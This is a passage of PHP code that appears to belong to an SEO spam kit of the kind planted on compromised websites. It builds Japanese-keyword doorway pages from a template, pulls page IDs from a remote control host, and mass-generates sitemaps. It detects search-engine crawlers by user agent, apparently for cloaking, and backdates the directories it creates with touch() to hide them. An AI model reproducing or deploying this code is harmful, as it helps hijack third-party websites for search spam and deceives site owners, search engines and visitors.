$fr1Strs = '<ul>'.PHP_EOL;
foreach($fr1Arr as $key=>$vs){
	$tpPid = $key;
	$tpFlink = getalink($tpPid);
	$fr1Strs .= '<li><a title="'.$vs.'" href="'.$tpFlink.'">'.$vs.'</a></li>'.PHP_EOL;
}
$fr1Strs .= '</ul>'.PHP_EOL;

if(isset($fr2Arr)){
	$fr2Strs = '<ul>'.PHP_EOL;
	foreach($fr2Arr as $key=>$vs){
		$tpPid = $key;
		$tpFlink = getalink($tpPid);
		$fr2Strs .= '<li><a title="'.$vs.'" href="'.$tpFlink.'">'.$vs.'</a></li>'.PHP_EOL;
	}
	$fr2Strs .= '</ul>'.PHP_EOL;
}

 
 $thisPnameLink = '<a href="">'.$nowIdName.'</a>';
 $thisPnameLink2 = '<a title="'.$nowIdName.'" href="">'.$nowIdName.'</a>';
 
 $thisTitleLink = '<a title="'.$Ptitle.'" href="">'.$Ptitle.'</a>';



		$fileMb = fopen("moban.html","r");
			$html = fread($fileMb,filesize("moban.html"));			
	
			$html = str_ireplace('#bbbtitsbbb#', $Ptitle. " - {$thisdom}", $html);	
			$html = str_ireplace('#bbbkeybbb#', $pkeyword, $html);	
			$html = str_ireplace('#bbbdesbbb#', $pdescription, $html);	
			
			$html = str_ireplace('#bbb1content1bbb#', $BreadStr . PHP_EOL .'<div>'.$artArr[0].'</div>', $html);
			$html = str_ireplace('#bbb2content2bbb#', $artArr[1], $html);
			$html = str_ireplace('#descontent#', $artArr[2], $html);
			
			$html = str_replace('#link1#',$thisPnameLink,$html);
				$html = str_replace('#link2#','',$html);
				$html = str_replace('#link3#',$thisPnameLink,$html);
				$html = str_replace('#link4#','',$html);
				$html = str_replace('#link5#',$thisPnameLink,$html);
				
				$html = str_replace('#flink#',$fr1Strs,$html);
				$html = str_replace('#Flink2#','',$html);
			
		
	echo $html;
 
die();
	
	


function getBreadcrum($Ptitle,$catArr){

	global $arrBread,$thisdom;


	$breadTagkey = KEYJG % 4;
	if($breadTagkey == 0){
		$breadTagHtml1 = 'nav';
		$breadTagHtml2 = 'ul';
	}elseif($breadTagkey == 1){
		$breadTagHtml1 = 'nav';
		$breadTagHtml2 = 'ol';
	}elseif($breadTagkey == 2){
		$breadTagHtml1 = 'div';
		$breadTagHtml2 = 'ol';
	}else{
		$breadTagHtml1 = 'div';
		$breadTagHtml2 = 'ul';
	}


	$arrBreadNum = count($arrBread);
	$domlen = strlen($thisdom);


	$breadTagkey = $domlen % 5;

	$strBreads = '';
	if($breadTagkey == 4){
		$strBreads .= '<'.$breadTagHtml1.' class="Breadcrumbs">';
		$strBreads .= '<'.$breadTagHtml2.'>';
		$strBreads .= '<li><a href="/">ホーム</a></li>';
		if(count($catArr)){
			foreach($catArr as $vs){
				$vs = trim($vs);
				$nowCatUrl = getCatLink($vs);
				$strBreads .= '<li><a href="'.$nowCatUrl.'">'.$vs.'</a></li>';
			}
		}
		
		$strBreads .= '<li>'.$Ptitle.'</li>';
		$strBreads .= '</'.$breadTagHtml2.'>';
		$strBreads .= '</'.$breadTagHtml1.'>';
	}else{
		$calssBreadKey = KEYJG % $arrBreadNum;
		$classTop = $arrBread[$calssBreadKey];
		$classul =  KEYJG % 2 ? 'Breadcrumb' : 'breadcrumbs';
		$breadTagkey = $domlen % 2;

		if($breadTagkey == 0){
			if($classTop)
				$strBreads .= '<'.$breadTagHtml1.' class="'.$classTop.'">';
			else
				$strBreads .= '<'.$breadTagHtml1.'>';
			
			$strBreads .= '<'.$breadTagHtml2.' class="'.$classul.'" itemscope itemtype="http://schema.org/BreadcrumbList">';
			$strBreads .= '<li itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a itemprop="item" href="/"><span itemprop="name">ホーム</span></a><meta itemprop="position" content="1" /></li>';
			$flagNum = 2;
			if(count($catArr)){
				foreach($catArr as $vs){
					$vs = trim($vs);
					$nowCatUrl = getCatLink($vs);
					$strBreads .= '<li itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a itemprop="item" href="'.$nowCatUrl.'"><span itemprop="name">'.$vs.'</span></a><meta itemprop="position" content="'.$flagNum.'" /></li>';
					$flagNum++;
				}
			}
				
				
			$strBreads .= '<li itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><span itemprop="name">'.$Ptitle.'</span><meta itemprop="position" content="'.$flagNum.'" /></li>';
				
			$strBreads .= '</'.$breadTagHtml2.'>';
			$strBreads .= '</'.$breadTagHtml1.'>';
		}else{
			if($classTop)
				$strBreads .= '<'.$breadTagHtml1.' class="'.$classTop.'">';
			else
				$strBreads .= '<'.$breadTagHtml1.'>';
			
			$strBreads .= '<'.$breadTagHtml2.' class="'.$classul.'" itemscope itemtype="http://schema.org/BreadcrumbList">';
			$strBreads .= '<li itemscope itemtype="http://data-vocabulary.org/Breadcrumb"><a href="/" itemprop="url"><span itemprop="title">ホーム</span></a></li>';
			if(count($catArr)){
				foreach($catArr as $vs){
					$vs = trim($vs);
					$nowCatUrl = getCatLink($vs);
					$strBreads .= '<li itemscope itemtype="http://data-vocabulary.org/Breadcrumb"><a href="'.$nowCatUrl.'" itemprop="url"><span itemprop="title">'.$vs.'</span></a></li>';
				}
			}
				
				
			$strBreads .= '<li><strong>'.$Ptitle.'</strong></li>';
				
			$strBreads .= '</'.$breadTagHtml2.'>';
			$strBreads .= '</'.$breadTagHtml1.'>';
		}
	}
	
	
	return $strBreads;

}


function getCatLink($CatName){
		
		global $arrnametime,$arrKeywz,$arr_word,$strRand;		
	
		$filePres = '';		$fileEnds = '';		$siteLink='http://'.$_SERVER['HTTP_HOST'];
		$dirNames = dirname(__FILE__);		$httcReplace = end((explode(DIRECTORY_SEPARATOR, $dirNames)));		
		if(JDT == 2){
			$filePres = $siteLink ."/". $httcReplace . "/" . basename(__FILE__) . "/";		}elseif(JDT == 1){
			$filePres = $siteLink ."/". $httcReplace . "/";		}elseif(JDT == 3){
			$filePres = $siteLink ."/". $httcReplace . "/" .basename(__FILE__) . "?keyword=";		}else{
			$filePres = $siteLink."/";		}
		
		
		if(JDT == 3){
			
			$CatName = preg_replace('#\s+#i','',$CatName);
			$linkCenter = str_replace('-','',$CatName);	
			$rtStr = $filePres.$linkCenter;
			$rtStr = str_replace($filePres.'-',$filePres,$rtStr);
		
			return $rtStr;
			
			}
		
		
		
		
		$CatName = preg_replace('#\s+#i','',$CatName);
		$linkCenter = str_replace('-','',$CatName);
		$linkCenter .= JTHZ;		
		$rtStr = $filePres.$linkCenter;
		$rtStr = str_replace($filePres.'-',$filePres,$rtStr);
		
		return $rtStr;
			
	}


function getMapNum($bgNum,$mapnum){
	$TempArr = array();
	if($bgNum + $mapnum <= FNUM){
		for($i=0;$i<$mapnum;$i++){
			$TempArr[$i] = $bgNum + $i -1;
		}
	}else{
		for($i=0;$i<$mapnum;$i++){
			if($bgNum+$i > FNUM)
				$TempArr[$i] = $bgNum + $i -1 -FNUM;
			else
				$TempArr[$i] = $bgNum + $i -1;
		}
	}
	
	return $TempArr;
}



function getRandId(){
	$num = rand(1,FNUM);	$num = $num - 1;	
	
		$idUrl =  GETDOM . "gpage.php?getid=$num";
		$tempIdStr = curl_get_from_webpage($idUrl,'',5);
		$arrId = explode(',',$tempIdStr);
	
	$indexId=array_rand($arrId,1);	$id = $arrId[$indexId];	unset($arrId);	return $id;}
	
	
function get_arrvs($arr,$num,$nowkey){
	$numArr = count($arr);	
	if($nowkey + $num < $numArr)
		return $arr[$nowkey + $num];	else{
		if($nowkey + $num - $numArr - $numArr > 0)
			return get_arrvs($arr,$num - $numArr,$nowkey);		else
			return $arr[abs($nowkey + $num - $numArr)];	}
}

function get_pre_link($arr,$key){
	
	$tmpA1 = array();	$tmpA2 = array();	
	$num = count($arr);	
	
	if($key + JGNUM + 1 + LINKNUM >= $num){
		
		if($key + JGNUM + 1 - $num > LINKNUM){
			return array_slice($arr, $key + JGNUM + 1 - $num, LINKNUM);		}else{
		
		$duoyu = $key + JGNUM + 1 + LINKNUM - $num + 1;		$tmpA1 = array_slice($arr, $key + JGNUM + 1, LINKNUM);		$tmpA2 = array_slice($arr, 0, $duoyu);			
		return array_merge($tmpA1,$tmpA2);		}
	}else{
			return  array_slice($arr, $key + JGNUM + 1, LINKNUM);	}
	
}
function get_next_link($arr,$key){
	
	$tmpA1 = array();	$tmpA2 = array();	
	$num = count($arr);	if($key - JGNUM - LINKNUM < 0 && $key - JGNUM > 0){
		$duoyu = abs($key - JGNUM - LINKNUM);		$tmpA1 = array_slice($arr, 0, abs($key - JGNUM));		$tmpA2 = array_slice($arr, $num-$duoyu-1, $duoyu);		return array_merge($tmpA1,$tmpA2);	}else{
			return  array_slice($arr, $key - JGNUM - LINKNUM, LINKNUM);	}
}
function rFile($file){
	if(function_exists('file_get_contents')){
		return file_get_contents($file);
	}else{
		$handle = fopen($file, "r");
		$contents = fread($handle, filesize($file));
		fclose($handle);
		return $contents;
	}
}
function isCrawler() {
	$agent= @strtolower($_SERVER['HTTP_USER_AGENT']);	if (!empty($agent)) {
		$spiderSite= array(
			"Googlebot",
			"Mediapartners-Google",
			"Adsbot-Google",
			"Yahoo!",
			"Google AdSense",
			"Yahoo Slurp",
			"bingbot",
			"MSNBot"
		);		foreach($spiderSite as $val) {
		$str = strtolower($val);		if (strpos($agent, $str) !== false) {
			return true;			}
		}
	} else {
		return false;	}
} 

function glink($filenames,$jdt=1){
	$filePres = '';	$fileEnds = '';	
	if($jdt == 1){
		$filePres = basename(__FILE__) . "?id=";	}else{
		$filePres = '';		$fileEnds = JTHZ;	}
	////获取文件目录
	$fpath='http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];	$serpath=substr($fpath,0,strrpos($fpath,'/'));
	$siteLink='http://'.$_SERVER['HTTP_HOST'];		
	$put_str = '';
	$urlsArray = $filenames;	//print_r($urlsArray);
	$numLinks = count($urlsArray);	
	foreach($urlsArray as $value){
		$curphp=basename(__FILE__); 
		$first=stristr($value,".php");		$last=stristr($value,".xml");		$checkTxt =stristr($value,".txt");		//print_r( $value.$curphp."   ".$first."   ".$last);		if($first===false && $last===false && $checkTxt===false)
		{
			
			$url=$serpath ."/". $filePres . PRENAME . '-' . basename($value) .$fileEnds;			$put_str .= $url . PHP_EOL;				
		}
	}
		$gFile =  'urls.txt';		echo '<br/>'.$gFile.'';
		@unlink($gFile);		file_put_contents($gFile,$put_str);		echo "生成成功！<br/>";	
}
//生成sitemap.xml文件，超出4000个则换一个xml文件；参数$c=1生成原始路径的sitemap，$c=2则生成映射后的路径
//$dir目录参数


function print_map2($filenames,$c=1,$jdt=1){

	$filePres = '';	$fileEnds = '';	
	$dirNames = dirname(__FILE__);	$httcReplace = end((explode(DIRECTORY_SEPARATOR, $dirNames)));			
	if(JDT == 2){
		$filePres = $httcReplace . "/" . basename(__FILE__) . "/";	}elseif(JDT == 1){
		$filePres = $httcReplace . "/";	}elseif(JDT == 3){
		$filePres = $httcReplace . "/" .basename(__FILE__) . "?key=";	}else{
		$filePres = '';	}
	if(JDT == 3){
		$fileEnds = '';	}else{
		$fileEnds = JTHZ;	}
	$fpath='http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];	$serpath=substr($fpath,0,strrpos($fpath,'/'));
	$siteLink='http://'.$_SERVER['HTTP_HOST'];		
	$mapPre = '<'.'?xml version="1.0" encoding="UTF-8" ?'.'>'. PHP_EOL.'<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . PHP_EOL;	$mapEnd = PHP_EOL .  '</urlset>';
	// $urlsArray = $filenames;
	// $numLinks = count($urlsArray);
	$star = 0;	$priority = 0.1;	$starPri = 0;	$gFile ="";	$date = date("Y-m-d");	$time = date("H:i:s");
	$str = "";						
	$tempArr1 = $filenames;
	
	foreach($tempArr1 as $value2){
		$curphp=basename(__FILE__); 
		$value = $value2;		$first=stristr($value,".php");		$last=stristr($value,".xml");		$checkTxt =stristr($value,".txt");		$tempPid = $value;
				$url = getalink($tempPid);
		
		
		
		if($first===false && $last===false && $checkTxt===false)
		{
			$date = date("Y-m-d");			$time = date("H:i:s");				
		
			if($star % 12000==11999){
				$put_str = $mapPre . $str . $mapEnd;
				header("Content-type: text/xml");
				echo $put_str;
				return;		
			}
			
		
			
	
			$str .= "     <url>
			 <loc>" . $url . "</loc> 
			 <lastmod>". $date . "T" . $time ."-05:00</lastmod>   
			 <changefreq>daily</changefreq> 
			 <priority>0.1</priority> 
			 </url>
		";	
			
			
			$star++;			$starPri++;		}
	}
	
	{
		
		$put_str = $mapPre . $str . $mapEnd;		
		header("Content-type: text/xml");
		echo $put_str;

	}
	
	unset($tempArr1);	unset($filenames);	
}

function print_map($filenames,$c=1,$jdt=1){
	$filePres = '';	$fileEnds = '';	
	
	$fpath='http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];	$serpath=substr($fpath,0,strrpos($fpath,'/'));
	$siteLink='http://'.$_SERVER['HTTP_HOST'];		
	$mapPre = '<'.'?xml version="1.0" encoding="UTF-8" ?'.'>'. PHP_EOL.'<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . PHP_EOL;	$mapEnd = PHP_EOL .  '</urlset>';
	// $urlsArray = $filenames;
	// $numLinks = count($urlsArray);
	
	$star = 0;	$priority = 0.9;	$starPri = 0;	$gFile ="";	$date = date("Y-m-d");	$time = date("H:i:s");
	$str = "     <url>
			 <loc>" . $siteLink . "</loc> 
			 <lastmod>". $date . "T" . $time ."-05:00</lastmod> 
			 <changefreq>always</changefreq> 
			 <priority>1.0</priority> 
			 </url>
		";						
	$tempArr1 = $filenames;
	
	foreach($tempArr1 as $value2){
		$curphp=basename(__FILE__); 
		$value = $value2;		$first=stristr($value,".php");		$last=stristr($value,".xml");		$checkTxt =stristr($value,".txt");		
			$tempPid = $value;
				$url = getalink($tempPid);
		
		
		if($first===false && $last===false && $checkTxt===false)
		{
			$date = date("Y-m-d");			$time = date("H:i:s");			
	
			if($star % 12000==11999){
				$put_str = $mapPre . $str . $mapEnd;
				header("Content-type: text/xml");
				echo $put_str;
				return;			
			}
			
			if($starPri >= 400 && $priority != 0.1){
				$starPri = 0;				$priority = $priority - 0.1;			}
			
			if($priority > 0.1){
				
				$str .= "     <url>
					 <loc>" . $url . "</loc> 
					 <lastmod>". $date . "T" . $time ."-05:00</lastmod>   
					 <changefreq>daily</changefreq> 
					 <priority>". $priority . "</priority> 
					 </url>
				";	
			}else{
										$str .= "     <url>
			 <loc>" . $url . "</loc> 
			 <lastmod>". $date . "T" . $time ."-05:00</lastmod>   
			 <changefreq>daily</changefreq> 
			 <priority>0.1</priority> 
			 </url>
		";	
			}
			
			$star++;			$starPri++;		}
	}
	
	{
		
		$put_str = $mapPre . $str . $mapEnd;
		header("Content-type: text/xml");		
		echo $put_str;

	}
	
	unset($tempArr1);	unset($filenames);		
}

function gsitemap2($filenames,$c=1,$jdt=1){
	global $gnumber,$arrArrr;
	$filePres = '';	$fileEnds = '';	
	$dirNames = dirname(__FILE__);	$httcReplace = end((explode(DIRECTORY_SEPARATOR, $dirNames)));			
	if(JDT == 2){
		$filePres = $httcReplace . "/" . basename(__FILE__) . "/";	}elseif(JDT == 1){
		$filePres = $httcReplace . "/";	}elseif(JDT == 3){
		$filePres = $httcReplace . "/" .basename(__FILE__) . "?key=";	}else{
		$filePres = '';	}
	if(JDT == 3){
		$fileEnds = '';	}else{
		$fileEnds = JTHZ;	}
	$fpath='http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];	$serpath=substr($fpath,0,strrpos($fpath,'/'));
	$siteLink='http://'.$_SERVER['HTTP_HOST'];		
	$mapPre = '<'.'?xml version="1.0" encoding="UTF-8" ?'.'>'. PHP_EOL.'<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . PHP_EOL;	$mapEnd = PHP_EOL .  '</urlset>';
	// $urlsArray = $filenames;
	// $numLinks = count($urlsArray);
	$star = 0;	$priority = 0.1;	$starPri = 0;	$gFile ="";	$date = date("Y-m-d");	$time = date("H:i:s");
	$str = "";						
	$tempArr1 = $filenames;
	
	foreach($tempArr1 as $value2){
		$curphp=basename(__FILE__); 
		$value = $value2;		$first=stristr($value,".php");		$last=stristr($value,".xml");		$checkTxt =stristr($value,".txt");		
			$tempPid = $value;
				$url = getalink($tempPid);
		
		
		
		if($first===false && $last===false && $checkTxt===false)
		{
			$date = date("Y-m-d");			$time = date("H:i:s");				
		
			if($star % 12000==11999){
				$gFile =  '../sitemaps/sitemap' . $gnumber .'.xml';				echo '<br/>'.$gFile.'<br/>';				$put_str = $mapPre . $str . $mapEnd;				@unlink($gFile);				file_put_contents($gFile,$put_str);
				$str = '';				$gnumber++;				return;			}
			
		
			
	
			$str .= "     <url>
			 <loc>" . $url . "</loc> 
			 <lastmod>". $date . "T" . $time ."-05:00</lastmod>   
			 <changefreq>daily</changefreq> 
			 <priority>0.1</priority> 
			 </url>
		";	
			
			
			$star++;			$starPri++;		}
	}
	
	{
		$gFile =  '../sitemaps/sitemap' . $gnumber .'.xml';		$gnumber++;		echo '<br/>'.$gFile.'<br/>';
		$put_str = $mapPre . $str . $mapEnd;		@unlink($gFile);		file_put_contents($gFile,$put_str);	
	}
	
	unset($tempArr1);	unset($filenames);	
	echo "生成sitemap成功！";	
}
function gsitemap($filenames,$c=1,$jdt=1){
	global $gnumber,$arrArrr;	
	$filePres = '';	$fileEnds = '';	
	
	$fpath='http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];	$serpath=substr($fpath,0,strrpos($fpath,'/'));
	$siteLink='http://'.$_SERVER['HTTP_HOST'];		
	$mapPre = '<'.'?xml version="1.0" encoding="UTF-8" ?'.'>'. PHP_EOL.'<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . PHP_EOL;	$mapEnd = PHP_EOL .  '</urlset>';
	// $urlsArray = $filenames;
	// $numLinks = count($urlsArray);
	
	$star = 0;	$priority = 0.9;	$starPri = 0;	$gFile ="";	$date = date("Y-m-d");	$time = date("H:i:s");
	$str = "     <url>
			 <loc>" . $siteLink . "</loc> 
			 <lastmod>". $date . "T" . $time ."-05:00</lastmod> 
			 <changefreq>always</changefreq> 
			 <priority>1.0</priority> 
			 </url>
		";						
	$tempArr1 = $filenames;
	
	foreach($tempArr1 as $value2){
		$curphp=basename(__FILE__); 
		$value = $value2;		$first=stristr($value,".php");		$last=stristr($value,".xml");		$checkTxt =stristr($value,".txt");	
		
			$tempPid = $value;
				$url = getalink($tempPid);
		
		if($first===false && $last===false && $checkTxt===false)
		{
			$date = date("Y-m-d");			$time = date("H:i:s");			
	
			if($star % 12000==11999){
				$gFile =  '../sitemaps/sitemap' . $gnumber .'.xml';				echo '<br/>'.$gFile.'<br/>';				
				$put_str = $mapPre . $str . $mapEnd;				@unlink($gFile);				file_put_contents($gFile,$put_str);
				$str = '';				$gnumber++;				return;				
			}
			
			if($starPri >= 400 && $priority != 0.1){
				$starPri = 0;				$priority = $priority - 0.1;			}
			
			if($priority > 0.1){
				
				$str .= "     <url>
					 <loc>" . $url . "</loc> 
					 <lastmod>". $date . "T" . $time ."-05:00</lastmod>   
					 <changefreq>daily</changefreq> 
					 <priority>". $priority . "</priority> 
					 </url>
				";	
			}else{
										$str .= "     <url>
			 <loc>" . $url . "</loc> 
			 <lastmod>". $date . "T" . $time ."-05:00</lastmod>   
			 <changefreq>daily</changefreq> 
			 <priority>0.1</priority> 
			 </url>
		";	
			}
			
			$star++;			$starPri++;		}
	}
	
	{
		$gFile =  '../sitemaps/sitemap' . $gnumber .'.xml';		echo '<br/>'.$gFile.'<br/>';		
		$gnumber++;
		$put_str = $mapPre . $str . $mapEnd;		@unlink($gFile);		file_put_contents($gFile,$put_str);	
	}
	
	unset($tempArr1);	unset($filenames);	echo "生成sitemap成功！";	
}


  
function fillUrl($str = '', $url){
	$relur = '#(?:href|src) ?= ?"([^"]+)"#s';	
	$urlInfo = parse_url($url);	
	
	preg_match_all($relur, $str, $matches);
	if(count($matches[1])){
		foreach($matches[1] as $values){
			if(!strstr($values, "//") && !strstr($values, "..")){
				$rStr =  $urlInfo['host']."/".$values;				$rStr =  'http://' . str_replace('//','/',$rStr);				
				$str = str_replace('"'.$values.'"', '"'.$rStr.'"' , $str) ;			}elseif(strstr($values, "..")){
				
				// echo $urlInfo['host'];				// echo str_replace(basename($url),"",$url);				// die();				
				$rStr = str_replace(basename($url),"",$url)."/".$values;				
				
				$rStr = str_replace("http://","<llqhttp>",$rStr);				
				$rStr = str_replace("https://","<llqhttps>",$rStr);				
				$rStr = str_replace("//","/",$rStr);				
				$rStr = str_replace("<llqhttps>","https://",$rStr);				
				$rStr = str_replace("<llqhttp>","http://",$rStr);				
				$str = str_replace('"'.$values.'"', '"'.$rStr.'"' , $str) ;			}
		}
	}	
	
	
	$relur = '#(?:href|src) ?= ?\'([^\']+)\'#s';	
	$urlInfo = parse_url($url);	
	
	preg_match_all($relur, $str, $matches);	
	// print_r($matches[1]);	
	if(count($matches[1])){
		foreach($matches[1] as $values){
			if(!strstr($values, "//") && !strstr($values, "..")){
					$rStr =  $urlInfo['host']."/".$values;				$rStr =  'http://' . str_replace('//','/',$rStr);				$str = str_replace("'".$values."'", "'".$rStr."'" , $str) ;			}elseif(strstr($values, "..")){
				
				$rStr = str_replace(basename($url),"",$url)."/".$values;				
				
				$rStr = str_replace("http://","<llqhttp>",$rStr);				
				$rStr = str_replace("https://","<llqhttps>",$rStr);				
				$rStr = str_replace("//","/",$rStr);				
				$rStr = str_replace("<llqhttps>","https://",$rStr);				
				$rStr = str_replace("<llqhttp>","http://",$rStr);				
				$str = str_replace("'".$values."'", "'".$rStr."'" , $str) ;			}
		}
	}
	return $str;}
function auto_read($str, $charset='UTF-8') {
	$list = array('EUC-JP', 'Shift_JIS', 'UTF-8',  'iso-2022-jp');
	$encode = mb_detect_encoding($str, $list);	// echo $encode;die();	
	if($encode == 'UTF-8'){
		return $str;	}else{
		return mb_convert_encoding($str, $charset, $encode);	}
	 
}
function detect_encoding($file){
	$list = array('GBK', 'UTF-8', 'UTF-16LE', 'UTF-16BE', 'ISO-8859-1');	$str = file_get_contents($file);	foreach ($list as $item) {
		$tmp = mb_convert_encoding($str, $item, $item);		if (md5($tmp) == md5($str)) {
		
			return $item;		}
	}
	return null;}
function curl_get_from_webpage($url,$proxy='',$loop=10){
	$data = false;        $i = 0;        while(!$data) {
             $data = curl_get_from_webpage_one_time($url,$proxy);             if($i++ >= $loop) break;        }
	return $data;}
 

function curl_getjs_from_webpage($url,$time){
if(function_exists("curl_init") && function_exists("curl_setopt") && function_exists("curl_exec") && function_exists("curl_close")){
 
    $curl = curl_init();	//如果有用代理,则使用代理.
	$user_agent = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; chromeframe/12.0.742.100";			
	// $urlReferer = "http://www.google.com";
	curl_setopt($curl, CURLOPT_URL, $url);	
		if(stristr($url,"https:")){ curl_setopt_array($curl, array(CURLOPT_SSL_VERIFYHOST => 2,CURLOPT_SSL_VERIFYPEER => 0,	CURLOPT_POSTFIELDS => '',			CURLOPT_RETURNTRANSFER => 1,CURLOPT_TIMEOUT => $time,CURLOPT_USERAGENT => $user_agent,CURLOPT_HEADER => 1,			CURLOPT_VERBOSE => 0
			));}else{curl_setopt($curl, CURLOPT_URL, $url);curl_setopt($curl, CURLOPT_TIMEOUT, $time);curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);curl_setopt($curl, CURLOPT_HEADER, false);curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);curl_setopt($curl, CURLOPT_USERAGENT, $user_agent);
	}$data=curl_exec($curl);curl_close($curl); 
  }else{
 
    $is_auf=ini_get('allow_url_fopen') && function_exists("file_get_contents")?true:false; 
    if($is_auf){
		$data = file_get_contents($url); 
    }
 
  }
	if(!$data) return false;
	return $data;	
	
}

function curl_get_from_webpage_one_time($url,$proxy=''){
if(function_exists("curl_init") && function_exists("curl_setopt") && function_exists("curl_exec") && function_exists("curl_close")){
 
    $curl = curl_init();	//如果有用代理,则使用代理.
	$user_agent = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; chromeframe/12.0.742.100";			
	// $urlReferer = "http://www.google.com";
	if(strlen($proxy) > 8) curl_setopt($curl, CURLOPT_PROXY, $proxy);
curl_setopt($curl, CURLOPT_URL, $url);	
		if(stristr($url,"https:")){ curl_setopt_array($curl, array(CURLOPT_SSL_VERIFYHOST => 2,CURLOPT_SSL_VERIFYPEER => 0,	CURLOPT_POSTFIELDS => '',			CURLOPT_RETURNTRANSFER => 1,CURLOPT_USERAGENT => $user_agent,CURLOPT_HEADER => 1,			CURLOPT_VERBOSE => 0
			));}else{curl_setopt($curl, CURLOPT_URL, $url);curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);curl_setopt($curl, CURLOPT_HEADER, false);curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);curl_setopt($curl, CURLOPT_USERAGENT, $user_agent);
	}$data=curl_exec($curl);curl_close($curl); 
  }else{
 
    $is_auf=ini_get('allow_url_fopen') && function_exists("file_get_contents")?true:false; 
    if($is_auf){
		$data = file_get_contents($url); 
    }
 
  }
	if(!$data) return false;
	return $data;	
	
}



	
//



function my_mkdir($dir){
		global  $fitime;
		if(!is_dir($dir)){
			mkdir($dir);
			@touch($dir, $fitime, $fitime);   
		} 
	}
	

	
	function generate_dir_file($gDir=''){
		
		global $hostDir;
		$gDir = str_replace('/',DIRECTORY_SEPARATOR,$gDir);
		$gDir = str_replace('\\',DIRECTORY_SEPARATOR,$gDir);
		$arr = explode(DIRECTORY_SEPARATOR,$gDir);
		
		if(count($arr) <= 0) return;
		
		if(!strstr($gDir,$hostDir))
			$dir = $hostDir;
		else
			$dir = '';


		for($i = 0 ; $i < count($arr)-1 ; $i++){
			$dir .= DIRECTORY_SEPARATOR . $arr[$i];
			my_mkdir($dir);
		}
		
		return $dir;
	}
		
	
	function getalink($pid){
		
		global $arrnametime,$arrKeywz,$arr_word,$strRand;		
	
		$filePres = '';		$fileEnds = '';		$siteLink='http://'.$_SERVER['HTTP_HOST'];
		$dirNames = dirname(__FILE__);		$httcReplace = end((explode(DIRECTORY_SEPARATOR, $dirNames)));		
		if(JDT == 2){
			$filePres = $siteLink ."/". $httcReplace . "/" . basename(__FILE__) . "/";		}elseif(JDT == 1){
			$filePres = $siteLink ."/". $httcReplace . "/";		}elseif(JDT == 3){
			$filePres = $siteLink ."/". $httcReplace . "/" .basename(__FILE__) . "?keyword=";		}else{
			$filePres = $siteLink."/";		}
		
		$ms = $arrnametime[$pid % count($arrnametime)];		
		
		$keyNum = $arrKeywz[$pid % count($arrKeywz)];		
		$keyWordKey = $pid % 10;		$keyStrKey = $pid % strlen("icedrkswzjhpnxoyvumfatblgq");		$keyArr = array();		$flag = 0;		
		if($ms == 2 or $ms ==4){
			if($keyNum >= 9){
				$fg = 4;			}elseif($keyNum >= 7){
				 $fg = 3;			}else{
				 $fg = 2;			}
		}
		
		for($i=0;$i<$keyNum;$i++){
			$tempNum = $arr_word[$i][$keyWordKey];			$tempstr = '';			for($j=0;$j<$tempNum;$j++)
				$tempstr .= $strRand[$flag++]{$keyStrKey};			
			$keyArr[$i] = $tempstr;
			if($flag >= count($strRand))
				$flag = 0;
		}
		
		$PidWz = $pid % $keyNum;		$linkCenter = '';
		
		if(JDT == 3){
			
			$tplinkArr = array();
			for($i=0;$i<$keyNum;$i++){			
				$tplinkArr[] = $keyArr[$i];		
				if($PidWz == $i)
				    $tplinkArr[] = $pid;				
			}
			
			$linkCenter = implode('-',$tplinkArr);
			$linkCenter = $linkCenter . "#llq";		
			$linkCenter = str_replace('-#llq','',$linkCenter);	
			$linkCenter = str_replace('#llq','',$linkCenter);
			$linkCenter = str_replace('--','-',$linkCenter);	
			$linkCenter = str_replace('/-','/',$linkCenter);				
			$rtStr = $filePres.$linkCenter;
			$rtStr = str_replace($filePres.'-',$filePres,$rtStr);
		
			return $rtStr;
			
			}
		
		
		
		
		$tplinkArr = array();
		for($i=0;$i<$keyNum;$i++){
							
				$tplinkArr[] = $keyArr[$i];	
				if($PidWz == $i)
					$tplinkArr[] = $pid;
				
		}
			
		$linkCenter = implode('-',$tplinkArr);
		$linkCenter .= JTHZ;
		$linkCenter = str_replace("-".JTHZ,JTHZ,$linkCenter);	
		$linkCenter = str_replace('--','-',$linkCenter);	
		$linkCenter = str_replace('/-','/',$linkCenter);	
			
		$rtStr = $filePres.$linkCenter;
		$rtStr = str_replace($filePres.'-',$filePres,$rtStr);
		
		return $rtStr;
	}
	
	
	function rmhtmltag($tagname='',$str=''){
		$rulers = '#<'.$tagname.'[^>]*>.*?</'.$tagname.'>#s';
		$str = preg_replace($rulers,'',$str);
		$rulers = '#<'.$tagname.'[^>]*>.*?</'.$tagname.'>#i';
		$str = preg_replace($rulers,'',$str);
		return $str;
	
	}
  
  
  function rmhtmltag2($tagname='',$str=''){
		$rulers = '#<'.$tagname.'[^>]*>#s';
		$str = preg_replace($rulers,'',$str);
		$rulers = '#</'.$tagname.'>#s';
		$str = preg_replace($rulers,'',$str);
	
	$rulers = '#<'.$tagname.'[^>]*>#i';
	$str = preg_replace($rulers,'',$str);
	$rulers = '#</'.$tagname.'>#i';
	$str = preg_replace($rulers,'',$str);
	return $str;
	
	}
	
	
	
// 

	
	
function is_ip($localIp,$ipRanges)
{    
	$localIp = ip2long($localIp);  
	foreach($ipRanges as $val)
	{ 
